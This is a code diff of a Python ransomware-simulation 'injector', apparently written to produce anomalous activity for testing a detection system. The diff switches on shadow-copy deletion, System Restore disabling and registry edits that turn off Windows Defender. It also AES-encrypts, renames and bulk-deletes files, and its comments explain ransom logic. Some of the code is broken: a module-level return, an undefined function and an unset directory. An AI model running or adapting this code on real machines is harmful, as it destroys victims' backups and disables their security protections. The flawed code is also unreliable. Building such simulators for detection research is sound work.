@@ -1,33 +1,47 @@
+"""
+Decription:     An all in one injector for ransomware attack simulation.
+Author:         Nadir Hussain
+Dated:          Jan 25, 2025
+"""
 import os
 import time
 import random
 import string
 import json
+from dotenv import load_dotenv
+
+# Packages for encryption, and decryption of data
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
+
+# For compress files
 from shutil import make_archive, rmtree
+
+# For changing system permissions
 from stat import S_IWRITE, S_IREAD, S_IRWXU, S_IRWXG, S_IRWXO
-from dotenv import load_dotenv
+
+# For registry edits, shadow copy and restore point operations
 import subprocess
+
+# For running this injector with admin level previliges
 import ctypes
 import sys
+
+# for cpu, memory and other resource details
 import psutil
-import logging
+
+# garbage collector to clean memory when it exceeds vm limit
 import gc
 
-logging.basicConfig(
-    filename='log_injector.log',
-    level=logging.DEBUG,
-    format='%(asctime)s - %(levelname)s - %(message)s'
-)
+# Directory under attack, we could do this for whole system but injector encrypts files, and we don't want to encrypt systems files or other critical data on our system
+WORKING_DIR = None
 
-# Setup: Define the working directory
-WORKING_DIR = "/Users/nadir/ransomware" 
-os.makedirs(WORKING_DIR, exist_ok=True)
+# Metadata for encryption and renaming, goal is to get original names back upon decryption
 METADATA_FILE = "metadata.json"
 
-# Metadata for encryption and renaming
-file_metadata = {}  # In-memory metadata for tracking operations
+# In-memory metadata for tracking operations: i.e we don't encrypt same file twice, because the goal is to be able to decrypt files back, in return of payment/ransom
+file_metadata = {}  
+
 
 """Check if the script is running with administrative privileges."""
 def is_admin():
@@ -36,27 +50,24 @@ def is_admin():
     except Exception:
         return False
 
-# Helper Functions
+"""Get random string, useful for folder names, file renames"""
 def random_string(length=8):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
-
+"""Save files' meta info i.e name, path to a JSON file."""
 def save_metadata():
-    """Persist metadata to a JSON file."""
     with open(METADATA_FILE, "w") as f:
         json.dump(file_metadata, f)
 
-
+"""Loads metadata from a JSON file."""
 def load_metadata():
-    """Load metadata from a JSON file."""
     global file_metadata
     if os.path.exists(METADATA_FILE):
         with open(METADATA_FILE, "r") as f:
             file_metadata = json.load(f)
 
-
+"""Ensures the original file is tracked in metadata."""
 def ensure_original_file(filepath):
-    """Ensure the original file is tracked in metadata."""
     if filepath not in file_metadata:
         file_metadata[filepath] = {
             "original_name": filepath,
@@ -66,8 +77,8 @@ def ensure_original_file(filepath):
         }
 
 
+"""Creates a new text file with random content."""
 def create_file(directory):
-    """Create a new text file with random content."""
     try:
         filename = os.path.join(directory, f"{random_string()}.txt")
         with open(filename, 'w') as f:
@@ -81,9 +92,8 @@ def create_file(directory):
     except Exception as e:
         print(f"Error creating file: {e}")
 
-
+"""Create a folder and populate it with random files."""
 def create_folder(directory):
-    """Create a folder and populate it with random files."""
     try:
         folder_name = os.path.join(directory, f"folder_{random_string()}")
         os.makedirs(folder_name)
@@ -97,9 +107,8 @@ def create_folder(directory):
     except Exception as e:
         print(f"Error creating folder: {e}")
 
-
+"""Rename a file to a random name."""
 def rename_file(filepath):
-    """Rename a file to a random name."""
     try:
         metadata = file_metadata.get(filepath)
         if not metadata or metadata["renamed"]:
@@ -120,11 +129,9 @@ def rename_file(filepath):
         print(f"Error renaming {filepath}: {e}")
         return filepath
 
-
+"""Encrypt a file using AES-256. The choice of algo is based on its complexity to decrypt, means we should not be able to decrypt files if we don't have key"""
 def encrypt_file(filepath):
-    """Encrypt a file using AES-256."""
     mem = psutil.virtual_memory()
-    print(f"Memory1 Usage: {mem.percent}% used, {mem.available // (1024 ** 2)} MB available")
     try:
         metadata = file_metadata.get(filepath)
         if not metadata or metadata["encrypted"]:
@@ -148,7 +155,7 @@ def encrypt_file(filepath):
         # Create an encrypted filename with a `.encrypted` extension
         encrypted_filename = f"{filepath}.encrypted"
         with open(encrypted_filename, 'wb') as f:
-            # Prepend key and IV to encrypted data
+            # For simplicity, we append key within file itself. In real, this key is with attacker, who reveals when payment is paid
             f.write(key + iv + encrypted_data)
 
         # Update metadata for decryption
@@ -164,22 +171,17 @@ def encrypt_file(filepath):
         save_metadata()
         print(f"Encrypted: {encrypted_filename} (AES-256)")
         mem = psutil.virtual_memory()
-        print(f"Memory2 Usage: {mem.percent}% used, {mem.available // (1024 ** 2)} MB available")
 
     except MemoryError as e:
-        print(f"MemoryError while encrypting {filepath}: {e}")
         mem = psutil.virtual_memory()
-        print(f"Memory3 Usage: {mem.percent}% used, {mem.available // (1024 ** 2)} MB available")
 
     except Exception as e:
         mem = psutil.virtual_memory()
-        print(f"Memory4 Usage: {mem.percent}% used, {mem.available // (1024 ** 2)} MB available")
         print(f"Error encrypting {filepath}: {e}")
 
 
-
+"""Encrypt all files in a directory, including existing ones."""
 def encrypt_all_files(directory):
-    """Encrypt all files in a directory, including existing ones."""
     try:
         for root, _, files in os.walk(directory):
             for file in files:
@@ -189,9 +191,8 @@ def encrypt_all_files(directory):
     except Exception as e:
         print(f"Error encrypting all files: {e}")
 
-
+"""Decrypt a single file back to its original state."""
 def decrypt_file(filepath):
-    """Decrypt a single file back to its original state."""
     try:
         metadata = file_metadata.get(filepath)
         if not metadata or not metadata["encrypted"]:
@@ -201,6 +202,7 @@ def decrypt_file(filepath):
         with open(filepath, 'rb') as f:
             file_data = f.read()
 
+        # For simplicity, we appended key within file itself. In real, this key is with attacker, who reveals when payment is paid
         # Extract key, IV, and encrypted data
         key = file_data[:32]
         iv = file_data[32:48]
@@ -242,12 +244,11 @@ def decrypt_all_files(directory):
             filepath = os.path.join(root, file)
             decrypt_file(filepath)
 
+"""
+Compress a folder or all root-level files in the working directory.
+If target_path is a folder, compress it and replace the folder with a .zip file. If target_path is the WORKING_DIR, compress all root-level files into root_files.zip.
+"""
 def compress(target_path):
-    """
-    Compress a folder or all root-level files in the working directory.
-    If target_path is a folder, compress it and replace the folder with a .zip file.
-    If target_path is the WORKING_DIR, compress all root-level files into root_files.zip.
-    """
     try:
         if os.path.isdir(target_path):
             # Compress a folder
@@ -276,8 +277,8 @@ def compress(target_path):
         print(f"Error during compression: {e}")
 
 
+"""Change the timestamps of a file."""
 def change_timestamps(filepath):
-    """Change the timestamps of a file."""
     try:
         new_time = time.mktime((2020, 1, 1, random.randint(0, 23), random.randint(0, 59), random.randint(0, 59), 0, 0, 0))
         os.utime(filepath, (new_time, new_time))
@@ -286,8 +287,8 @@ def change_timestamps(filepath):
         print(f"Error changing timestamps for {filepath}: {e}")
 
 
+"""Delete multiple random files, excluding original files. Note that original files are not deleted during ransomware attack, ethically those has to be decrypted or recovered when ransom is paid by the victim"""
 def bulk_delete():
-    """Delete multiple random files, excluding original files."""
     try:
         files = [f for f in file_metadata if not file_metadata[f].get("is_original", False)]
         if files:
@@ -300,8 +301,8 @@ def bulk_delete():
     except Exception as e:
         print(f"Error during bulk delete: {e}")
         
+"""Change file permissions to simulate user/admin access."""
 def change_permission(filepath, to_admin=False):
-    """Change file permissions to simulate user/admin access."""
     try:
         if to_admin:
             os.chmod(filepath, S_IRWXU | S_IRWXG | S_IRWXO)  # Full access
@@ -311,8 +312,8 @@ def change_permission(filepath, to_admin=False):
     except Exception as e:
         print(f"Error changing permissions for {filepath}: {e}")
 
+"""Shadow copies store the user's data as backup, ransomware removes them at start"""
 def disable_shadow_copies():
-    """Simulate shadow copy deletion."""
     try:
         print("Simulating shadow copy deletion...")
         if not is_admin():
@@ -325,8 +326,8 @@ def disable_shadow_copies():
     except Exception as e:
         print(f"Error during shadow copy deletion: {e}")
 
+"""Disabling system restore. Restore points are checkoints, that user can revert back to them, used specifically if user installed an update on system (typically an infected updated), and everything gets infected. so ransomware deletes restore points so user can't go back"""
 def disable_system_restore():
-    """Simulate disabling system restore."""
     try:
         print("Simulating disabling system restore...")
         if not is_admin():
@@ -337,10 +338,10 @@ def disable_system_restore():
     except Exception as e:
         print(f"Error disabling system restore: {e}")
 
+"""Registry of system contains info about firewall, defender, task manager, so we typically disable all of them so user can't figure out what is hapenning"""
 def modify_registry():
-    """Simulate registry modifications for ransomware behavior."""
     try:
-        print("Simulating registry modification...")
+        print("Updating registry records...")
 
         # Disable Windows Defender
         subprocess.run([
@@ -375,7 +376,9 @@ def modify_registry():
     except Exception as e:
         print(f"Error modifying registry: {e}")
 
-
+"""
+This is core of injector, that runs operations in ordered + random way
+"""
 def inject_operations(duration=180):
     
     # Load metadata at the start
@@ -389,10 +392,11 @@ def inject_operations(duration=180):
     start_time = time.time()
 
     # one time operations: typically, a ransomware disables and modifies these at start of its execution
-    # disable_shadow_copies()
-    # disable_system_restore()
-    # modify_registry()
+    disable_shadow_copies()
+    disable_system_restore()
+    modify_registry()
 
+    # injector has 4 variants. 3 (I1, I2, I3) are used of injections i.e on which system is labelled as anomolous. While I4 is used to inject normal behaior. This makes sure that system is not sensitive to few operations, and should not produce False Positives.
     I1 = [
         "create_file", "create_folder", "rename_file", "encrypt_file",
         "encrypt_all_files",
@@ -415,19 +419,20 @@ def inject_operations(duration=180):
         "encrypt_file"
     ]
 
-    gc.collect()  # Add at start
-    memory_threshold = 85  # Stop if memory usage exceeds 85%
+    gc.collect()
+    memory_threshold = 85  
+
 
     while time.time() - start_time < duration:
         
-        # In virtual machine, when memory reaches to its limit, the script halts so to prevent that I have coded this logic here
+        # In virtual machine, when memory reaches to its limit, the script halts so to prevent that, and waits for 5 seconds to continue
         mem = psutil.virtual_memory()
         if mem.percent > memory_threshold:
-            logging.warning(f"Memory usage critical: {mem.percent}%. Pausing operations.")
+            print(f"Memory usage critical: {mem.percent}%. Pausing operations.")
             time.sleep(5)
             continue
 
-        operation = random.choice(I4)
+        operation = random.choice(I1) # we just need to change injector types here, for varying behavior. For Ix, the operation is chosen on random. In case of I4, only 1 operation is there
 
         try:
             if operation == "create_file":
@@ -490,8 +495,8 @@ def inject_operations(duration=180):
         except Exception as e:
             print(f"Error during {operation}: {e}")
 
-        # Random delay between operations 0.5 to 2 seconds
-        time.sleep(random.uniform(2, 3))  
+        # Random delay between operations 0.5 to 2 seconds for I1, I2, I3. 2 to 3 seconds for I4
+        time.sleep(random.uniform(0.5, 2))  
     save_metadata()
 
 if __name__ == "__main__":
@@ -503,8 +508,12 @@ if __name__ == "__main__":
             )
             
             sys.exit()
+             # Get directory from user
+        WORKING_DIR = select_directory()
+        if not WORKING_DIR:
+            print("No directory selected. Exiting...")
+            return
 
-        logging.info("Script started")
         action = input("Enter 'inject' to inject ransomware or 'decrypt' to decrypt files: ").strip().lower()
         if action == 'inject':
             inject_operations(duration=60)
@@ -514,5 +523,4 @@ if __name__ == "__main__":
         else:
             print("Invalid action. Please enter 'inject' or 'decrypt'.")
     except Exception as e:
-        logging.error(f"Error: {e}")
         input("Error occurred. Check logs. Press Enter to exit.")
